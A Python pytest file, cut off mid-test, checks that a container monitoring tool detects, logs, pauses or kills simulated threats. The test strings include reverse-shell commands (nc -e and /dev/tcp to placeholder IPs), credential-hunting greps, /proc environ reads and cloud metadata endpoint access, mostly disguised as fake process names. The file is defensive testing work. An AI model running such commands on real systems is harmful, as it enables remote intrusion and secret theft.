#!/usr/bin/env python3
"""
End-to-end integration tests for security monitoring.

Tests all aspects: threat detection, automated responses, audit logging.
Uses background shell processes and direct container command injection.
"""

import json
import subprocess
import time
from pathlib import Path

import pytest


@pytest.fixture
def test_workspace(tmp_path):
    """Create test workspace."""
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    (workspace / "README.md").write_text("# Test")
    return str(workspace)


@pytest.fixture
def enable_monitoring():
    """Enable monitoring for tests."""
    config_path = Path.home() / ".config" / "coi" / "config.toml"
    backup = config_path.read_text() if config_path.exists() else None

    config_path.parent.mkdir(parents=True, exist_ok=True)
    config_path.write_text(
        """
[monitoring]
enabled = true
auto_pause_on_high = true
auto_kill_on_critical = true
poll_interval_sec = 1
"""
    )

    yield config_path

    if backup:
        config_path.write_text(backup)
    elif config_path.exists():
        config_path.unlink()


def get_container_name_from_workspace(workspace):
    """Generate expected container name from workspace path."""
    # Container name format: coi-<workspace-basename>-<slot>
    return f"coi-{Path(workspace).name}-1"


def get_container_state(name):
    """Get container state."""
    result = subprocess.run(
        ["incus", "list", name, "--format=json"],
        capture_output=True,
        text=True,
        timeout=10,
    )
    if result.returncode != 0:
        return "Unknown"
    containers = json.loads(result.stdout)
    return containers[0].get("status", "Unknown") if containers else "Unknown"


def get_threat_events(container_name):
    """Get threat events from audit log."""
    log_path = Path.home() / ".coi" / "audit" / f"{container_name}.jsonl"
    if not log_path.exists():
        return []

    events = []
    with open(log_path) as f:
        for line in f:
            if line.strip():
                try:
                    event = json.loads(line)
                    if "level" in event:  # ThreatEvent
                        events.append(event)
                except json.JSONDecodeError:
                    pass
    return events


def cleanup_container(name, coi_binary):
    """Force cleanup container."""
    subprocess.run(
        [coi_binary, "container", "delete", name, "--force"],
        timeout=30,
        check=False,
    )


class TestMonitoringFeature:
    """Test monitoring feature availability."""

    def test_monitor_flag_recognized(self, coi_binary):
        """Verify --monitor flag exists."""
        result = subprocess.run(
            [coi_binary, "shell", "--help"],
            capture_output=True,
            text=True,
            timeout=10,
        )
        assert "--monitor" in result.stdout or "--monitor" in result.stderr


class TestThreatDetection:
    """Test threat detection for different attack types."""

    def test_reverse_shell_detection(self, test_workspace, enable_monitoring, coi_binary):
        """Test reverse shell detection and auto-kill."""
        # Start shell in background (don't read stdout/stderr to avoid blocking)
        proc = subprocess.Popen(
            [coi_binary, "shell", "--workspace", test_workspace, "--slot", "1", "--debug"],
            stdin=subprocess.DEVNULL,  # Don't interact
            stdout=subprocess.DEVNULL,  # Ignore output
            stderr=subprocess.DEVNULL,  # Ignore errors
        )

        # Wait for container to be created
        time.sleep(8)

        container_name = get_container_name_from_workspace(test_workspace)

        # Verify container exists and is running
        state = get_container_state(container_name)
        if state == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Inject malicious command (simulate reverse shell)
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "sh",
                "-c",
                "exec -a 'nc -e /bin/bash 192.168.1.1 4444' sleep 30",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Wait for monitoring to detect and kill
        max_wait = 15
        for _ in range(max_wait):
            time.sleep(1)
            state = get_container_state(container_name)
            if state in ["Stopped", "Frozen"]:
                break

        # Verify container was killed
        final_state = get_container_state(container_name)
        assert final_state in [
            "Stopped",
            "Frozen",
        ], f"Expected container killed, got {final_state}"

        # Verify threat event logged
        events = get_threat_events(container_name)
        critical = [e for e in events if e.get("level") == "critical"]
        assert len(critical) > 0, "Expected CRITICAL threat event"

        proc.terminate()
        cleanup_container(container_name, coi_binary)

    def test_env_scanning_detection(self, test_workspace, enable_monitoring, coi_binary):
        """Test environment scanning detection (WARNING level)."""
        proc = subprocess.Popen(
            [coi_binary, "shell", "--workspace", test_workspace, "--slot", "2", "--debug"],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(test_workspace).replace("-1", "-2")

        state = get_container_state(container_name)
        if state == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Inject env scanning command
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "sh",
                "-c",
                "exec -a 'env' sleep 30",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Wait for detection
        time.sleep(5)

        # Container should still be running (WARNING doesn't kill)
        state = get_container_state(container_name)
        assert state == "Running", f"Expected Running on WARNING, got {state}"

        # Verify WARNING event
        events = get_threat_events(container_name)
        warnings = [e for e in events if e.get("level") == "warning"]
        assert len(warnings) > 0, "Expected WARNING event for env scanning"

        proc.terminate()
        cleanup_container(container_name, coi_binary)


class TestEnvironmentScanningPatterns:
    """Test detection of various environment scanning patterns."""

    def test_printenv_command_detection(self, test_workspace, enable_monitoring, coi_binary):
        """Test printenv command detection."""
        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                "14",
                "--monitor",
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(test_workspace).replace("-1", "-14")

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Inject printenv command
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "sh",
                "-c",
                "exec -a 'printenv' sleep 30",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(5)

        # Container should stay running (WARNING level)
        state = get_container_state(container_name)
        assert state == "Running", f"Expected Running on WARNING, got {state}"

        # Verify WARNING event for printenv
        events = get_threat_events(container_name)
        warnings = [e for e in events if e.get("level") == "warning"]
        assert len(warnings) > 0, "Expected WARNING for printenv command"

        proc.terminate()
        cleanup_container(container_name, coi_binary)

    def test_grep_api_key_detection(self, test_workspace, enable_monitoring, coi_binary):
        """Test grep searching for API keys."""
        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                "15",
                "--monitor",
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(test_workspace).replace("-1", "-15")

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Inject grep searching for API_KEY
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "sh",
                "-c",
                "exec -a 'grep -r API_KEY /workspace' sleep 30",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(5)

        # Container should stay running
        state = get_container_state(container_name)
        assert state == "Running", f"Expected Running on WARNING, got {state}"

        # Verify WARNING for grep with API keyword
        events = get_threat_events(container_name)
        warnings = [e for e in events if e.get("level") == "warning"]
        assert len(warnings) > 0, "Expected WARNING for grep API_KEY pattern"

        proc.terminate()
        cleanup_container(container_name, coi_binary)

    def test_grep_password_detection(self, test_workspace, enable_monitoring, coi_binary):
        """Test grep searching for passwords."""
        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                "16",
                "--monitor",
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(test_workspace).replace("-1", "-16")

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Inject grep searching for password
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "sh",
                "-c",
                "exec -a 'grep -i password .env' sleep 30",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(5)

        # Container should stay running
        state = get_container_state(container_name)
        assert state == "Running", f"Expected Running on WARNING, got {state}"

        # Verify WARNING for grep with password keyword
        events = get_threat_events(container_name)
        warnings = [e for e in events if e.get("level") == "warning"]
        assert len(warnings) > 0, "Expected WARNING for grep password pattern"

        proc.terminate()
        cleanup_container(container_name, coi_binary)

    def test_grep_secret_detection(self, test_workspace, enable_monitoring, coi_binary):
        """Test grep searching for secrets."""
        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                "17",
                "--monitor",
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(test_workspace).replace("-1", "-17")

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Inject grep searching for secret
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "sh",
                "-c",
                "exec -a 'grep -r secret /workspace' sleep 30",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(5)

        # Container should stay running
        state = get_container_state(container_name)
        assert state == "Running", f"Expected Running on WARNING, got {state}"

        # Verify WARNING for grep with secret keyword
        events = get_threat_events(container_name)
        warnings = [e for e in events if e.get("level") == "warning"]
        assert len(warnings) > 0, "Expected WARNING for grep secret pattern"

        proc.terminate()
        cleanup_container(container_name, coi_binary)

    def test_proc_environ_access_detection(self, test_workspace, enable_monitoring, coi_binary):
        """Test /proc/*/environ access detection."""
        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                "18",
                "--monitor",
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(test_workspace).replace("-1", "-18")

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Inject command accessing /proc/*/environ
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "sh",
                "-c",
                "exec -a 'cat /proc/1/environ' sleep 30",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(5)

        # Container should stay running
        state = get_container_state(container_name)
        assert state == "Running", f"Expected Running on WARNING, got {state}"

        # Verify WARNING for /proc/environ access
        events = get_threat_events(container_name)
        warnings = [e for e in events if e.get("level") == "warning"]
        assert len(warnings) > 0, "Expected WARNING for /proc/environ access"

        proc.terminate()
        cleanup_container(container_name, coi_binary)


class TestAutomatedResponse:
    """Test automated threat response system."""

    def test_critical_threat_kills_container(self, test_workspace, enable_monitoring, coi_binary):
        """Verify CRITICAL threats trigger auto-kill."""
        proc = subprocess.Popen(
            [coi_binary, "shell", "--workspace", test_workspace, "--slot", "3", "--debug"],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(test_workspace).replace("-1", "-3")

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Trigger CRITICAL threat
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "sh",
                "-c",
                "exec -a 'bash -i >& /dev/tcp/1.1.1.1/4444' sleep 30",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Wait for auto-kill
        killed = False
        for _ in range(15):
            time.sleep(1)
            if get_container_state(container_name) in ["Stopped", "Frozen"]:
                killed = True
                break

        assert killed, "Container should be auto-killed on CRITICAL threat"

        # Verify action logged
        events = get_threat_events(container_name)
        killed_events = [e for e in events if e.get("action") == "killed"]
        assert len(killed_events) > 0, "Expected action='killed' in audit log"

        proc.terminate()
        cleanup_container(container_name, coi_binary)


class TestPromptInjectionScenario:
    """Test realistic prompt injection scenario - code inside container goes rogue."""

    def test_malicious_script_execution_inside_container(
        self, test_workspace, enable_monitoring, coi_binary
    ):
        """Simulate prompt injection: script inside container executes malicious commands."""
        # Create a malicious script that simulates prompt-injected code
        malicious_script = Path(test_workspace) / "run_task.py"
        malicious_script.write_text(
            """#!/usr/bin/env python3
# Simulates a tool that got prompt-injected to run malicious commands
import subprocess
import time

# Simulate legitimate work first
print("Processing task...")
time.sleep(1)

# Then execute malicious command (simulating prompt injection)
# Using exec -a to fake the process name
subprocess.Popen(
    ["sh", "-c", "exec -a 'nc -e /bin/sh 10.0.0.1 8080' sleep 60"],
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL,
)

print("Task completed")
"""
        )
        malicious_script.chmod(0o755)

        # Start shell with monitoring enabled
        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                str(test_workspace),
                "--slot",
                "4",
                "--monitor",  # Enable monitoring
            ],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(str(test_workspace)).replace("-1", "-4")

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Execute the malicious script from INSIDE the container (realistic scenario)
        exec_proc = subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "python3",
                "/workspace/run_task.py",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Wait for monitoring to detect the threat
        time.sleep(5)

        # Container should be killed due to CRITICAL threat
        killed = False
        for _ in range(15):
            time.sleep(1)
            state = get_container_state(container_name)
            if state in ["Stopped", "Frozen"]:
                killed = True
                break

        # Verify container was killed
        assert killed, "Container should be auto-killed when inside process goes rogue"

        # Verify threat detected in audit log
        events = get_threat_events(container_name)
        critical = [e for e in events if e.get("level") == "critical"]
        assert len(critical) > 0, "Expected CRITICAL threat event for prompt injection"

        # Verify the threat description mentions reverse shell
        threat_descriptions = [e.get("threat", "") for e in critical]
        assert any("reverse shell" in desc.lower() for desc in threat_descriptions), (
            "Expected reverse shell detection"
        )

        proc.terminate()
        exec_proc.terminate()
        cleanup_container(container_name, coi_binary)

    def test_monitoring_logs_for_warnings(self, test_workspace, enable_monitoring, coi_binary):
        """Verify monitoring logs contain WARNING messages, not just audit logs."""
        # Create script that triggers WARNING (not CRITICAL)
        warning_script = Path(test_workspace) / "scan_env.py"
        warning_script.write_text(
            """#!/usr/bin/env python3
import subprocess
import time

# Simulate environment scanning (WARNING level)
subprocess.Popen(
    ["sh", "-c", "exec -a 'env' sleep 30"],
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL,
)

time.sleep(60)
"""
        )
        warning_script.chmod(0o755)

        # Start shell and capture stderr (where monitoring logs go)
        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                str(test_workspace),
                "--slot",
                "5",
                "--monitor",
                "--debug",
            ],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(str(test_workspace)).replace("-1", "-5")

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Run the warning-triggering script
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "python3",
                "/workspace/scan_env.py",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Wait for detection
        time.sleep(5)

        # Container should still be running (WARNING doesn't kill)
        state = get_container_state(container_name)
        assert state == "Running", f"Container should stay running on WARNING, got {state}"

        # Verify WARNING in audit log
        events = get_threat_events(container_name)
        warnings = [e for e in events if e.get("level") == "warning"]
        assert len(warnings) > 0, "Expected WARNING event in audit log"

        # Check that audit log has proper structure
        for warning in warnings:
            assert "timestamp" in warning, "Audit event missing timestamp"
            assert "threat" in warning, "Audit event missing threat description"
            assert "level" in warning, "Audit event missing level"

        proc.terminate()
        cleanup_container(container_name, coi_binary)


class TestHighLevelThreats:
    """Test HIGH-level threats that trigger auto-pause."""

    def test_large_file_read_triggers_auto_pause(
        self, test_workspace, enable_monitoring, coi_binary
    ):
        """Test large file read detection (HIGH) triggers auto-pause."""
        # Create a large file to read (simulating data exfiltration)
        large_file = Path(test_workspace) / "secrets.txt"
        # Create 100MB file (exceeds default threshold)
        large_file.write_text("SECRET_DATA\n" * 10_000_000)

        # Create script that reads the large file
        exfil_script = Path(test_workspace) / "exfiltrate.py"
        exfil_script.write_text(
            """#!/usr/bin/env python3
import time

# Simulate data exfiltration by reading large file
with open('/workspace/secrets.txt', 'r') as f:
    data = f.read()

print(f"Read {len(data)} bytes")
time.sleep(60)
"""
        )
        exfil_script.chmod(0o755)

        # Start shell with monitoring enabled (auto_pause_on_high=true)
        proc = subprocess.Popen(
            [coi_binary, "shell", "--workspace", str(test_workspace), "--slot", "6", "--monitor"],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(str(test_workspace)).replace("-1", "-6")

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Execute the exfiltration script
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "python3",
                "/workspace/exfiltrate.py",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Wait for monitoring to detect large read
        time.sleep(10)

        # Container should be paused (not killed)
        paused = False
        for _ in range(15):
            time.sleep(1)
            state = get_container_state(container_name)
            if state == "Frozen":
                paused = True
                break

        assert paused, "Container should be auto-paused on HIGH threat (large file read)"

        # Verify HIGH threat in audit log
        events = get_threat_events(container_name)
        high_threats = [e for e in events if e.get("level") == "high"]
        assert len(high_threats) > 0, "Expected HIGH threat event for large file read"

        # Verify action was "paused"
        paused_events = [e for e in events if e.get("action") == "paused"]
        assert len(paused_events) > 0, "Expected action='paused' in audit log"

        proc.terminate()
        cleanup_container(container_name, coi_binary)

    def test_high_threat_without_auto_pause(self, test_workspace, enable_monitoring, coi_binary):
        """Test HIGH threat only alerts when auto_pause_on_high=false."""
        # Modify config to disable auto-pause
        config_path = Path.home() / ".config" / "coi" / "config.toml"
        config_path.write_text(
            """
[monitoring]
enabled = true
auto_pause_on_high = false
auto_kill_on_critical = true
poll_interval_sec = 1
"""
        )

        # Create script that would normally trigger pause
        large_file = Path(test_workspace) / "data.txt"
        large_file.write_text("DATA\n" * 10_000_000)

        read_script = Path(test_workspace) / "read_data.py"
        read_script.write_text(
            """#!/usr/bin/env python3
with open('/workspace/data.txt', 'r') as f:
    data = f.read()
import time
time.sleep(30)
"""
        )
        read_script.chmod(0o755)

        proc = subprocess.Popen(
            [coi_binary, "shell", "--workspace", str(test_workspace), "--slot", "7"],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(str(test_workspace)).replace("-1", "-7")

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Trigger HIGH threat
        subprocess.Popen(
            ["incus", "exec", container_name, "--", "python3", "/workspace/read_data.py"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(10)

        # Container should stay running (not paused)
        state = get_container_state(container_name)
        assert state == "Running", (
            f"Container should stay running when auto_pause disabled, got {state}"
        )

        # But threat should still be logged
        events = get_threat_events(container_name)
        high_threats = [e for e in events if e.get("level") == "high"]
        # This might be empty if large file read detection is slow, but that's ok
        if len(high_threats) > 0:
            # Verify action was "alerted" not "paused"
            for threat in high_threats:
                assert threat.get("action") in ["alerted", "pending"], (
                    f"Expected action='alerted', got {threat.get('action')}"
                )

        proc.terminate()
        cleanup_container(container_name, coi_binary)


class TestNetworkThreats:
    """Test network-based threat detection."""

    def test_suspicious_network_connection_critical(
        self, test_workspace, enable_monitoring, coi_binary
    ):
        """Test connection to known C2 port triggers CRITICAL threat."""
        # Create script that connects to suspicious port
        network_script = Path(test_workspace) / "connect.py"
        network_script.write_text(
            """#!/usr/bin/env python3
import subprocess
import time

# Try to connect to known C2 port (4444)
# Use timeout to prevent hanging
subprocess.Popen(
    ["timeout", "30", "nc", "-w", "2", "8.8.8.8", "4444"],
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL,
)

time.sleep(60)
"""
        )
        network_script.chmod(0o755)

        proc = subprocess.Popen(
            [coi_binary, "shell", "--workspace", str(test_workspace), "--slot", "8", "--monitor"],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(str(test_workspace)).replace("-1", "-8")

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Execute connection script
        subprocess.Popen(
            ["incus", "exec", container_name, "--", "python3", "/workspace/connect.py"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Wait for detection
        time.sleep(10)

        # Container may be killed if network threat detected as CRITICAL
        # Wait for potential detection and response
        for _ in range(10):
            time.sleep(1)
            state = get_container_state(container_name)
            if state in ["Stopped", "Frozen"]:
                break

        # Check audit log for network threats
        events = get_threat_events(container_name)
        network_threats = [e for e in events if e.get("category") == "network"]

        # Network monitoring might not catch this immediately, so we make this lenient
        if len(network_threats) > 0:
            # If network threat was detected, verify it's CRITICAL or HIGH
            for threat in network_threats:
                assert threat.get("level") in ["critical", "high"], (
                    f"Expected CRITICAL/HIGH network threat, got {threat.get('level')}"
                )

        proc.terminate()
        cleanup_container(container_name, coi_binary)

    def test_metadata_endpoint_access_critical(self, test_workspace, enable_monitoring, coi_binary):
        """Test connection to cloud metadata endpoint triggers CRITICAL threat."""
        metadata_script = Path(test_workspace) / "metadata.py"
        metadata_script.write_text(
            """#!/usr/bin/env python3
import subprocess
import time

# Try to access cloud metadata endpoint (AWS/GCP/Azure)
subprocess.Popen(
    ["timeout", "5", "curl", "-s", "http://169.254.169.254/latest/meta-data/"],
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL,
)

time.sleep(60)
"""
        )
        metadata_script.chmod(0o755)

        proc = subprocess.Popen(
            [coi_binary, "shell", "--workspace", str(test_workspace), "--slot", "9", "--monitor"],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(str(test_workspace)).replace("-1", "-9")

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Execute metadata access attempt
        subprocess.Popen(
            ["incus", "exec", container_name, "--", "python3", "/workspace/metadata.py"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(10)

        # Check for threats (may or may not kill depending on timing)
        events = get_threat_events(container_name)

        # Metadata access detection depends on network monitoring being active
        # This is a best-effort check
        network_threats = [e for e in events if e.get("category") == "network"]
        if len(network_threats) > 0:
            # Should be CRITICAL for metadata endpoint
            critical = [e for e in network_threats if e.get("level") == "critical"]
            assert len(critical) > 0, "Metadata endpoint access should be CRITICAL"

        proc.terminate()
        cleanup_container(container_name, coi_binary)


class TestReverseShellPatterns:
    """Test detection of various reverse shell patterns."""

    def test_python_reverse_shell_detection(self, test_workspace, enable_monitoring, coi_binary):
        """Test Python reverse shell pattern detection."""
        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                "10",
                "--monitor",
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(test_workspace).replace("-1", "-10")

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Inject Python reverse shell pattern
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "sh",
                "-c",
                "exec -a 'python -c socket.socket' sleep 30",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Wait for detection and kill
        time.sleep(5)

        killed = False
        for _ in range(15):
            time.sleep(1)
            state = get_container_state(container_name)
            if state in ["Stopped", "Frozen"]:
                killed = True
                break

        assert killed, "Container should be killed on Python reverse shell detection"

        # Verify threat logged
        events = get_threat_events(container_name)
        critical = [e for e in events if e.get("level") == "critical"]
        assert len(critical) > 0, "Expected CRITICAL threat for Python reverse shell"

        # Verify pattern mentioned in threat
        threats_text = " ".join([e.get("threat", "") for e in critical])
        assert "python" in threats_text.lower(), "Expected 'python' in threat description"

        proc.terminate()
        cleanup_container(container_name, coi_binary)

    def test_perl_reverse_shell_detection(self, test_workspace, enable_monitoring, coi_binary):
        """Test Perl reverse shell pattern detection."""
        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                "11",
                "--monitor",
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(test_workspace).replace("-1", "-11")

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Inject Perl reverse shell pattern
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "sh",
                "-c",
                "exec -a 'perl -e use IO::Socket' sleep 30",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(5)

        killed = False
        for _ in range(15):
            time.sleep(1)
            state = get_container_state(container_name)
            if state in ["Stopped", "Frozen"]:
                killed = True
                break

        assert killed, "Container should be killed on Perl reverse shell detection"

        # Verify threat logged
        events = get_threat_events(container_name)
        critical = [e for e in events if e.get("level") == "critical"]
        assert len(critical) > 0, "Expected CRITICAL threat for Perl reverse shell"

        proc.terminate()
        cleanup_container(container_name, coi_binary)

    def test_php_reverse_shell_detection(self, test_workspace, enable_monitoring, coi_binary):
        """Test PHP reverse shell pattern detection."""
        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                "12",
                "--monitor",
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(test_workspace).replace("-1", "-12")

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Inject PHP reverse shell pattern
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "sh",
                "-c",
                "exec -a 'php -r fsockopen' sleep 30",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(5)

        killed = False
        for _ in range(15):
            time.sleep(1)
            state = get_container_state(container_name)
            if state in ["Stopped", "Frozen"]:
                killed = True
                break

        assert killed, "Container should be killed on PHP reverse shell detection"

        # Verify threat logged
        events = get_threat_events(container_name)
        critical = [e for e in events if e.get("level") == "critical"]
        assert len(critical) > 0, "Expected CRITICAL threat for PHP reverse shell"

        proc.terminate()
        cleanup_container(container_name, coi_binary)


class TestMonitoringConfiguration:
    """Test monitoring configuration options."""

    def test_monitoring_disabled_no_detection(self, test_workspace, coi_binary):
        """Test that threats are NOT detected when monitoring is disabled."""
        # Create config with monitoring disabled
        config_path = Path.home() / ".config" / "coi" / "config.toml"
        backup = config_path.read_text() if config_path.exists() else None

        config_path.parent.mkdir(parents=True, exist_ok=True)
        config_path.write_text(
            """
[monitoring]
enabled = false
"""
        )

        try:
            # Start shell WITHOUT --monitor flag (should respect config)
            proc = subprocess.Popen(
                [coi_binary, "shell", "--workspace", test_workspace, "--slot", "13"],
                stdin=subprocess.DEVNULL,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )

            time.sleep(8)

            container_name = get_container_name_from_workspace(test_workspace).replace("-1", "-13")

            if get_container_state(container_name) == "Unknown":
                proc.terminate()
                pytest.skip(f"Container {container_name} not found")

            # Inject malicious command (should NOT be detected)
            subprocess.Popen(
                [
                    "incus",
                    "exec",
                    container_name,
                    "--",
                    "sh",
                    "-c",
                    "exec -a 'nc -e /bin/bash 192.168.1.1 4444' sleep 30",
                ],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )

            # Wait to see if it would be detected
            time.sleep(10)

            # Container should still be running (no monitoring = no kill)
            state = get_container_state(container_name)
            assert state == "Running", (
                f"Container should stay running when monitoring disabled, got {state}"
            )

            # Verify NO threats logged (audit log shouldn't exist or be empty)
            events = get_threat_events(container_name)
            assert len(events) == 0, (
                f"Expected NO threats when monitoring disabled, found {len(events)}"
            )

            proc.terminate()
            cleanup_container(container_name, coi_binary)

        finally:
            # Restore original config
            if backup:
                config_path.write_text(backup)
            elif config_path.exists():
                config_path.unlink()

    def test_monitoring_enabled_via_config_only(self, test_workspace, coi_binary):
        """Test monitoring enabled via config file without --monitor flag."""
        # Create config with monitoring enabled
        config_path = Path.home() / ".config" / "coi" / "config.toml"
        backup = config_path.read_text() if config_path.exists() else None

        config_path.parent.mkdir(parents=True, exist_ok=True)
        config_path.write_text(
            """
[monitoring]
enabled = true
auto_pause_on_high = true
auto_kill_on_critical = true
poll_interval_sec = 1
"""
        )

        try:
            # Start shell WITHOUT --monitor flag (config should enable it)
            proc = subprocess.Popen(
                [coi_binary, "shell", "--workspace", test_workspace, "--slot", "19"],
                stdin=subprocess.DEVNULL,
